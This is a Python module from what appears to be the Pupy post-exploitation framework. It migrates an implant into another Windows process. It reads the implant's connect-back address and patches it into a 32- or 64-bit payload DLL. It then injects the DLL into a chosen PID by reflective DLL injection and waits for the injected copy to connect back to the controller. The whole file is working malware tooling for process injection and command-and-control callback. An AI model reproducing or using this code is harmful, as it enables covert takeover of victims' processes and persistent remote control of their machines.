# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import genpayload
import os.path
import time

__class_name__="MigrateModule"


def has_proc_migrated(client, pid):
	for c in client.pupsrv.clients:
		if all([True for x in c.desc if x in ["hostname", "platform", "release", "version", "macaddr"] and client.desc[x]==c.desc[x]]):
			if int(c.desc["pid"])==pid:
				return c
	return None

class MigrateModule(PupyModule):
	""" Migrate pupy into another process using reflective DLL injection """
	max_clients=1
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="migrate", description=self.__doc__)
		self.arg_parser.add_argument('pid', type=int, help='pid')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		dllbuf=b""
		isProcess64bits=False
		#TODO automatically fill ip/port
		self.client.load_package("psutil")
		self.client.load_package("pupwinutils.processes")
		self.success("looking for configured connect back address ...")
		res=self.client.conn.modules['pupy'].get_connect_back_host()
		host, port=res.rsplit(':',1)
		self.success("address configured is %s:%s ..."%(host,port))
		self.success("looking for process %s architecture ..."%args.pid)
		if self.client.conn.modules['pupwinutils.processes'].is_process_64(args.pid):
			isProcess64bits=True
			self.success("process is 64 bits")
			dllbuff=genpayload.get_edit_binary(os.path.join("payloads","pupyx64.dll"), host, port)
		else:
			self.success("process is 32 bits")
			dllbuff=genpayload.get_edit_binary(os.path.join("payloads","pupyx86.dll"), host, port)
		self.success("injecting DLL in target process %s ..."%args.pid)
		self.client.conn.modules['pupy'].reflective_inject_dll(args.pid, dllbuff, isProcess64bits)
		self.success("DLL injected !")
		self.success("waiting for a connection from the DLL ...")
		while True:
			c=has_proc_migrated(self.client, args.pid)
			if c:
				self.success("got a connection from migrated DLL !")
				c.desc["id"]=self.client.desc["id"]
				break
			time.sleep(0.1)
		try:
			self.client.conn.exit()
		except Exception:
			pass


